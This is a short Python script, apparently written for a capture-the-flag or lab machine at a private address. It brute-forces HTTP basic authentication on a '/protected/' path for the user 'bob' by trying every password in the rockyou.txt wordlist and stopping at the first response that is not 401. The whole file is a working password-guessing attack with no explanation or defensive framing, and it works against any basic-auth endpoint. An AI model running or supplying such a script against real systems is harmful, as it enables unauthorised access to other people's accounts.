import requests 

url = "http://10.10.39.251/protected/"
s = requests.Session()

with open('/usr/share/wordlists/rockyou.txt', 'r', errors='replace') as f:
    pwds = f.readlines()
    for pwd in pwds:
        pwd = pwd.strip()
        r  =requests.get(url, auth=('bob', pwd))

        print(f"> {pwd} - {r.status_code}")
        if r.status_code != 401:
            break 